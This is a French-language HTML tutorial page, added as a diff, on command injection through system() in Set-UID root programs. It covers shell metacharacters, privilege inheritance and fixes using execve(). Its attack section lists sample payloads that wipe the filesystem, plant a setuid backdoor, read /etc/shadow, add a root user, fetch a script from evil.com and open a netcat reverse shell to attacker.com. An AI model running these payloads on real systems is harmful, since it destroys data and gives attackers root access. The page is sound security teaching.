@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sécurité system() dans Set-UID - Claude Explains</title>
+    <link rel="stylesheet" href="claude-explains.min.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>SÉCURITÉ DES APPELS SYSTÈME DANS LES PROGRAMMES SET-UID</h1>
+            <p class="subtitle">Pourquoi system() est un danger critique et comment l'exploiter/s'en protéger</p>
+            <div>
+                <span class="badge badge-danger"><span>CRITIQUE</span></span>
+                <span class="badge badge-warning"><span>INJECTION</span></span>
+                <span class="badge badge-danger"><span>PRIVILEGE ESCALATION</span></span>
+            </div>
+        </header>
+        
+        <nav class="navigation">
+            <button class="btn-primary active" data-section="intro"><span>Introduction</span></button>
+            <button class="btn-primary" data-section="problem"><span>Le Problème</span></button>
+            <button class="btn-primary" data-section="attack"><span>Anatomie de l'Attaque</span></button>
+            <button class="btn-primary" data-section="mechanics"><span>Mécanique Interne</span></button>
+            <button class="btn-primary" data-section="defense"><span>Défense</span></button>
+            <button class="btn-primary" data-section="challenge"><span>Challenge</span></button>
+        </nav>
+        
+        <main>
+            <!-- ============================================ -->
+            <!-- INTRODUCTION INTUITIVE -->
+            <!-- ============================================ -->
+            <section id="intro" class="section active">
+                <div class="content-box">
+                    <h2>🎭 L'Analogie du Majordome Trop Obéissant</h2>
+                    
+                    <p>Imagine que tu as un <strong>majordome très puissant</strong> (un programme Set-UID root) qui peut faire n'importe quoi dans ta maison (système). Tu lui donnes des ordres comme :</p>
+                    
+                    <div class="code-block">
+                        <code>"Envoie un message à Jean"</code>
+                    </div>
+                    
+                    <p>Le problème ? Ce majordome est <span class="highlight">trop littéral</span>. Si tu dis :</p>
+                    
+                    <div class="code-block">
+                        <code>"Envoie un message à Jean ; puis brûle la maison ; puis donne-moi les clés"</code>
+                    </div>
+                    
+                    <p>Il va <strong>exécuter TOUTES les commandes</strong> sans se poser de questions, parce que tu as utilisé le mot magique <code>;</code> (point-virgule) qui signifie "et ensuite fais ça".</p>
+                    
+                    <h3>Le Vrai Problème en Sécurité</h3>
+                    
+                    <p>Dans le code que tu as vu :</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
+                        <code>sprintf(command, "/bin/mail %s", User_Input);
+system(command);</code>
+                    </div>
+                    
+                    <p>On prend une <strong>entrée utilisateur non vérifiée</strong> et on la passe directement à <code>system()</code>. C'est comme donner un micro ouvert à un inconnu dans ta maison et lui dire "dis au majordome ce que tu veux".</p>
+                    
+                    <div class="warning-box">
+                        <p><strong>Pourquoi c'est CRITIQUE dans un Set-UID ?</strong></p>
+                        <p>Parce que le programme s'exécute avec les <span class="highlight">privilèges root</span>. Un utilisateur normal peut donc faire exécuter des commandes root simplement en manipulant l'entrée.</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ============================================ -->
+            <!-- LE PROBLÈME EN PROFONDEUR -->
+            <!-- ============================================ -->
+            <section id="problem" class="section">
+                <div class="content-box">
+                    <h2>🔍 Disséquons le Code Vulnérable</h2>
+                    
+                    <h3>Étape 1 : Que fait ce code ?</h3>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
+                        <code>// Ligne 1 : Construction de la commande
+sprintf(command, "/bin/mail %s", User_Input);
+
+// Ligne 2 : Exécution via le shell
+system(command);</code>
+                    </div>
+                    
+                    <p><strong>Intention légitime :</strong></p>
+                    <ul>
+                        <li>L'utilisateur entre une adresse email : <code>alice@example.com</code></li>
+                        <li><code>sprintf</code> construit : <code>"/bin/mail alice@example.com"</code></li>
+                        <li><code>system()</code> exécute cette commande</li>
+                    </ul>
+                    
+                    <h3>Étape 2 : Pourquoi system() est dangereux ?</h3>
+                    
+                    <p>Contrairement à ce qu'on pourrait croire, <code>system()</code> ne lance PAS directement <code>/bin/mail</code>. Voici ce qui se passe réellement :</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
+                        <code>// Ce que system() fait en interne :
+execl("/bin/sh", "sh", "-c", command, (char *)0);</code>
+                    </div>
+                    
+                    <p>Traduction : <code>system()</code> lance d'abord un <strong>shell</strong> (<code>/bin/sh</code>), puis demande à ce shell d'interpréter la commande.</p>
+                    
+                    <div class="warning-box">
+                        <p><strong>Pourquoi c'est un problème ?</strong></p>
+                        <p>Le shell comprend les <span class="highlight">métacaractères</span> : <code>;</code>, <code>|</code>, <code>&</code>, <code>`</code>, <code>$</code>, etc. Ces caractères permettent d'enchaîner, rediriger, ou modifier l'exécution des commandes.</p>
+                    </div>
+                    
+                    <h3>Étape 3 : Les métacaractères du shell</h3>
+                    
+                    <table class="comparison-table">
+                        <thead>
+                            <tr>
+                                <th>Caractère</th>
+                                <th>Signification</th>
+                                <th>Exemple</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><code>;</code></td>
+                                <td>Séquence de commandes</td>
+                                <td><code>cmd1 ; cmd2</code> → exécute cmd1 puis cmd2</td>
+                            </tr>
+                            <tr>
+                                <td><code>|</code></td>
+                                <td>Pipe (redirection)</td>
+                                <td><code>cmd1 | cmd2</code> → sortie de cmd1 → entrée de cmd2</td>
+                            </tr>
+                            <tr>
+                                <td><code>&</code></td>
+                                <td>Exécution en arrière-plan</td>
+                                <td><code>cmd &</code> → lance cmd sans attendre</td>
+                            </tr>
+                            <tr>
+                                <td><code>`</code> ou <code>$()</code></td>
+                                <td>Substitution de commande</td>
+                                <td><code>echo `whoami`</code> → exécute whoami et insère le résultat</td>
+                            </tr>
+                            <tr>
+                                <td><code>&gt;</code> / <code>&lt;</code></td>
+                                <td>Redirection d'entrée/sortie</td>
+                                <td><code>cmd > file</code> → écrit la sortie dans file</td>
+                            </tr>
+                            <tr>
+                                <td><code>&&</code> / <code>||</code></td>
+                                <td>Conditionnels</td>
+                                <td><code>cmd1 && cmd2</code> → cmd2 si cmd1 réussit</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- ============================================ -->
+            <!-- ANATOMIE DE L'ATTAQUE -->
+            <!-- ============================================ -->
+            <section id="attack" class="section">
+                <div class="content-box">
+                    <h2>💀 L'Attaque en Action</h2>
+                    
+                    <h3>Payload Malveillant</h3>
+                    
+                    <p>L'attaquant entre ceci comme <code>User_Input</code> :</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
+                        <code>xyz@example.com ; rm -rf /* ; /bin/sh</code>
+                    </div>
+                    
+                    <h3>Décomposition Étape par Étape</h3>
+                    
+                    <p><strong>Étape 1 : Construction de la commande</strong></p>
+                    
+                    <div class="code-block">
+                        <code>// Ce que sprintf() produit :
+command = "/bin/mail xyz@example.com ; rm -rf /* ; /bin/sh"</code>
+                    </div>
+                    
+                    <p><strong>Étape 2 : Exécution par system()</strong></p>
+                    
+                    <p>Le shell voit cette chaîne et la découpe selon les <code>;</code> :</p>
+                    
+                    <div class="code-block">
+                        <code>Commande 1: /bin/mail xyz@example.com
+Commande 2: rm -rf /*
+Commande 3: /bin/sh</code>
+                    </div>
+                    
+                    <p><strong>Étape 3 : Exécution séquentielle</strong></p>
+                    
+                    <ol>
+                        <li><code>/bin/mail xyz@example.com</code> → S'exécute (peut échouer, on s'en fiche)</li>
+                        <li><code>rm -rf /*</code> → <span class="badge badge-danger"><span>DÉTRUIT LE SYSTÈME</span></span></li>
+                        <li><code>/bin/sh</code> → <span class="badge badge-danger"><span>OUVRE UN SHELL ROOT</span></span></li>
+                    </ol>
+                    
+                    <div class="warning-box">
+                        <p><strong>Résultat Final</strong></p>
+                        <p>L'attaquant obtient un <span class="highlight">shell root interactif</span> dans un programme qui était censé juste envoyer un email. C'est l'escalade de privilèges totale.</p>
+                    </div>
+                    
+                    <h3>Variations d'Attaque</h3>
+                    
+                    <div class="simulator">
+                        <h3>Autres Payloads Possibles</h3>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
+                            <code>// 1. Créer un backdoor
+user@host ; cp /bin/sh /tmp/backdoor ; chmod 4755 /tmp/backdoor
+
+// 2. Voler /etc/shadow
+user@host ; cat /etc/shadow > /tmp/stolen
+
+// 3. Ajouter un utilisateur root
+user@host ; echo "hacker::0:0::/root:/bin/bash" >> /etc/passwd
+
+// 4. Exécuter un script distant
+user@host ; curl http://evil.com/malware.sh | sh
+
+// 5. Netcat reverse shell
+user@host ; nc -e /bin/sh attacker.com 4444</code>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ============================================ -->
+            <!-- MÉCANIQUE INTERNE -->
+            <!-- ============================================ -->
+            <section id="mechanics" class="section">
+                <div class="content-box">
+                    <h2>⚙️ Pourquoi Ça Marche : Mécanique Interne</h2>
+                    
+                    <h3>1. Qu'est-ce que system() fait vraiment ?</h3>
+                    
+                    <p>Voici l'implémentation simplifiée de <code>system()</code> :</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
+                        <code>int system(const char *command) {
+    pid_t pid;
+    int status;
+    
+    // Fork un nouveau processus
+    pid = fork();
+    
+    if (pid == 0) {
+        // Processus enfant : lance le shell
+        execl("/bin/sh", "sh", "-c", command, (char *)0);
+        _exit(127);
+    }
+    
+    // Processus parent : attend la fin
+    waitpid(pid, &status, 0);
+    return status;
+}</code>
+                    </div>
+                    
+                    <p><strong>Ligne critique</strong> : <code>execl("/bin/sh", "sh", "-c", command, ...);</code></p>
+                    
+                    <ul>
+                        <li><code>/bin/sh</code> : Le shell à lancer</li>
+                        <li><code>-c</code> : "Execute la commande qui suit"</li>
+                        <li><code>command</code> : Notre chaîne contaminée</li>
+                    </ul>
+                    
+                    <h3>2. Le parsing du shell</h3>
+                    
+                    <p>Quand le shell reçoit <code>-c "cmd1 ; cmd2"</code>, voici son traitement :</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
+                        <code>// Pseudo-code du shell
+void execute_command(char *cmdline) {
+    // 1. Tokenisation selon les métacaractères
+    tokens = split_by_metacharacters(cmdline); // [cmd1, cmd2, cmd3]
+    
+    // 2. Exécution séquentielle
+    for (token in tokens) {
+        if (is_separator(token)) {
+            continue; // Ignore ; | & etc
+        }
+        execute_single_command(token);
+    }
+}</code>
+                    </div>
+                    
+                    <p>Le shell ne fait <strong>aucune distinction</strong> entre :</p>
+                    <ul>
+                        <li>Les commandes prévues par le développeur</li>
+                        <li>Les commandes injectées par l'utilisateur</li>
+                    </ul>
+                    
+                    <h3>3. Privilèges et Set-UID</h3>
+                    
+                    <p>Rappel : un programme Set-UID root s'exécute avec <code>euid=0</code> (root). Quand il appelle <code>system()</code> :</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
+                        <code>// Le processus parent (Set-UID)
+euid = 0 (root)
+uid = 1000 (utilisateur normal)
+
+// Fork → Le fils hérite des privilèges
+fork() → pid = X
+
+// Dans le fils (pid=X)
+euid = 0 (root) ← TOUJOURS ROOT
+execl("/bin/sh", ...) → Lance le shell EN ROOT
+
+// Le shell lance nos commandes EN ROOT
+rm -rf /* → S'exécute avec euid=0</code>
+                    </div>
+                    
+                    <div class="warning-box">
+                        <p><strong>Point Clé</strong></p>
+                        <p>Le shell hérité via <code>system()</code> conserve les privilèges root du programme Set-UID. Toutes les commandes injectées s'exécutent donc en root.</p>
+                    </div>
+                    
+                    <h3>4. Comparaison : system() vs execve()</h3>
+                    
+                    <table class="comparison-table">
+                        <thead>
+                            <tr>
+                                <th>Aspect</th>
+                                <th>system()</th>
+                                <th>execve()</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Intermédiaire</td>
+                                <td><span class="badge badge-danger"><span>SHELL</span></span></td>
+                                <td><span class="badge badge-success"><span>DIRECT</span></span></td>
+                            </tr>
+                            <tr>
+                                <td>Métacaractères</td>
+                                <td><span class="badge badge-danger"><span>INTERPRÉTÉS</span></span></td>
+                                <td><span class="badge badge-success"><span>IGNORÉS</span></span></td>
+                            </tr>
+                            <tr>
+                                <td>Injection possible</td>
+                                <td><span class="badge badge-danger"><span>OUI</span></span></td>
+                                <td><span class="badge badge-success"><span>NON</span></span></td>
+                            </tr>
+                            <tr>
+                                <td>Contrôle arguments</td>
+                                <td><span class="badge badge-danger"><span>FAIBLE</span></span></td>
+                                <td><span class="badge badge-success"><span>TOTAL</span></span></td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- ============================================ -->
+            <!-- DÉFENSE ET SOLUTIONS -->
+            <!-- ============================================ -->
+            <section id="defense" class="section">
+                <div class="content-box">
+                    <h2>🛡️ Comment se Défendre</h2>
+                    
+                    <h3>Solution 1 : Utiliser execve() Directement</h3>
+                    
+                    <p><strong>Principe :</strong> Éviter complètement le shell en passant les arguments de manière structurée.</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
+                        <code>// VERSION SÉCURISÉE
+pid_t pid = fork();
+
+if (pid == 0) {
+    // Arguments séparés : le shell ne peut pas les interpréter
+    char *args[] = {"/bin/mail", User_Input, NULL};
+    execve("/bin/mail", args, NULL);
+    _exit(1);
+}
+
+waitpid(pid, NULL, 0);</code>
+                    </div>
+                    
+                    <p><strong>Pourquoi c'est sûr ?</strong></p>
+                    <ul>
+                        <li><code>execve()</code> lance directement <code>/bin/mail</code> sans passer par un shell</li>
+                        <li><code>User_Input</code> est passé comme un <strong>argument unique</strong>, pas interprété</li>
+                        <li>Même si <code>User_Input</code> contient <code>;</code>, ce sera traité comme un caractère littéral</li>
+                    </ul>
+                    
+                    <h3>Solution 2 : Validation et Sanitization</h3>
+                    
+                    <p>Si on DOIT utiliser <code>system()</code> (rare), on doit <strong>whitelist</strong> les caractères autorisés :</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
+                        <code>// Fonction de validation stricte
+int is_safe_email(const char *input) {
+    // Regex simple : alphanumérique + @ + . + -
+    for (int i = 0; input[i] != '\0'; i++) {
+        char c = input[i];
+        if (!isalnum(c) && c != '@' && c != '.' && c != '-' && c != '_') {
+            return 0; // Caractère suspect détecté
+        }
+    }
+    return 1;
+}
+
+// Utilisation
+if (!is_safe_email(User_Input)) {
+    fprintf(stderr, "Invalid email format\n");
+    exit(1);
+}
+
+sprintf(command, "/bin/mail %s", User_Input);
+system(command);</code>
+                    </div>
+                    
+                    <div class="warning-box">
+                        <p><strong>Attention :</strong> Cette approche est fragile. Un oubli dans la validation = faille. Préférez toujours <code>execve()</code>.</p>
+                    </div>
+                    
+                    <h3>Solution 3 : Supprimer les Privilèges Avant system()</h3>
+                    
+                    <p>Si on doit lancer un shell, au moins retirer les privilèges root avant :</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
+                        <code>// Abaisser les privilèges
+setuid(getuid()); // euid = uid (utilisateur normal)
+
+// Maintenant system() ne peut plus faire de dégâts root
+sprintf(command, "/bin/mail %s", User_Input);
+system(command);</code>
+                    </div>
+                    
+                    <p><strong>Problème :</strong> Cette solution ne protège pas contre les attaques sur les fichiers de l'utilisateur. C'est mieux, mais pas parfait.</p>
+                    
+                    <h3>Tableau Récapitulatif</h3>
+                    
+                    <table class="comparison-table">
+                        <thead>
+                            <tr>
+                                <th>Méthode</th>
+                                <th>Sécurité</th>
+                                <th>Complexité</th>
+                                <th>Recommandation</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><code>system()</code> brut</td>
+                                <td><span class="badge badge-danger"><span>DANGER</span></span></td>
+                                <td>Facile</td>
+                                <td>❌ NE JAMAIS UTILISER</td>
+                            </tr>
+                            <tr>
+                                <td><code>system()</code> + validation</td>
+                                <td><span class="badge badge-warning"><span>RISQUÉ</span></span></td>
+                                <td>Moyen</td>
+                                <td>⚠️ Éviter si possible</td>
+                            </tr>
+                            <tr>
+                                <td><code>system()</code> + drop privs</td>
+                                <td><span class="badge badge-warning"><span>PARTIEL</span></span></td>
+                                <td>Moyen</td>
+                                <td>⚠️ Mieux mais insuffisant</td>
+                            </tr>
+                            <tr>
+                                <td><code>execve()</code> direct</td>
+                                <td><span class="badge badge-success"><span>SÉCURISÉ</span></span></td>
+                                <td>Légèrement plus complexe</td>
+                                <td>✅ TOUJOURS PRÉFÉRER</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- ============================================ -->
+            <!-- CHALLENGE INTERACTIF -->
+            <!-- ============================================ -->
+            <section id="challenge" class="section">
+                <div class="content-box">
+                    <h2>🎯 Challenge : Teste ta Compréhension</h2>
+                    
+                    <h3>Partie 1 : Analyse de Code</h3>
+                    
+                    <p>Pour chaque code, détermine s'il est vulnérable et explique pourquoi :</p>
+                    
+                    <div class="simulator">
+                        <h3>Code A</h3>
+                        <div class="code-block">
+                            <code>char cmd[256];
+sprintf(cmd, "echo %s >> /var/log/user.log", username);
+system(cmd);</code>
+                        </div>
+                        <p><strong>Question :</strong> Vulnérable ? Comment exploiter ?</p>
+                    </div>
+                    
+                    <div class="simulator">
+                        <h3>Code B</h3>
+                        <div class="code-block">
+                            <code>char *args[] = {"echo", username, NULL};
+execve("/bin/echo", args, NULL);</code>
+                        </div>
+                        <p><strong>Question :</strong> Vulnérable ? Pourquoi ou pourquoi pas ?</p>
+                    </div>
+                    
+                    <div class="simulator">
+                        <h3>Code C</h3>
+                        <div class="code-block">
+                            <code>if (strstr(filename, "..") == NULL) {
+    sprintf(cmd, "cat %s", filename);
+    system(cmd);
+}</code>
+                        </div>
+                        <p><strong>Question :</strong> La validation est-elle suffisante ? Trouve un bypass.</p>
+                    </div>
+                    
+                    <h3>Partie 2 : Exploitation Pratique</h3>
+                    
+                    <div class="simulator">
+                        <h3>Scénario</h3>
+                        <p>Tu as accès à ce programme Set-UID root :</p>
+                        
+                        <div class="code-block">
+                            <code>// backup_tool (Set-UID root)
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        printf("Usage: %s &lt;directory&gt;\n", argv[0]);
+        return 1;
+    }
+    
+    char cmd[512];
+    sprintf(cmd, "tar -czf /backup/backup.tar.gz %s", argv[1]);
+    system(cmd);
+    
+    printf("Backup completed!\n");
+    return 0;
+}</code>
+                        </div>
+                        
+                        <p><strong>Questions :</strong></p>
+                        <ol>
+                            <li>Écris un payload qui donne un shell root</li>
+                            <li>Écris un payload qui copie <code>/etc/shadow</code> dans <code>/tmp/stolen</code></li>
+                            <li>Réécris ce programme de manière sécurisée avec <code>execve()</code></li>
+                        </ol>
+                    </div>
+                    
+                    <h3>Partie 3 : Défense</h3>
+                    
+                    <div class="simulator">
+                        <h3>Corrige ce code</h3>
+                        <div class="code-block">
+                            <code>// mail_notifier (Set-UID root)
+void send_alert(char *message) {
+    char cmd[1024];
+    sprintf(cmd, "echo '%s' | mail -s 'Alert' admin@example.com", message);
+    system(cmd);
+}</code>
+                        </div>
+                        
+                        <p><strong>Tâche :</strong> Réécris cette fonction de 3 manières différentes, en ordre croissant de sécurité.</p>
+                    </div>
+                    
+                    <h3>Checklist de Compréhension</h3>
+                    
+                    <p>Tu as compris si tu peux expliquer :</p>
+                    
+                    <ul>
+                        <li>✅ Pourquoi <code>system()</code> lance un shell et pas la commande directement</li>
+                        <li>✅ Ce que sont les métacaractères et comment le shell les interprète</li>
+                        <li>✅ Pourquoi <code>;</code> permet d'enchaîner des commandes</li>
+                        <li>✅ Comment les privilèges sont hérités lors d'un <code>fork()</code></li>
+                        <li>✅ La différence fondamentale entre <code>system()</code> et <code>execve()</code></li>
+                        <li>✅ Pourquoi la validation par blacklist est insuffisante</li>
+                        <li>✅ Comment construire un payload d'exploitation complet</li>
+                    </ul>
+                </div>
+            </section>
+        </main>
+    </div>
+    
+    <script src="claude-explains.min.js"></script>
+</body>
+</html>
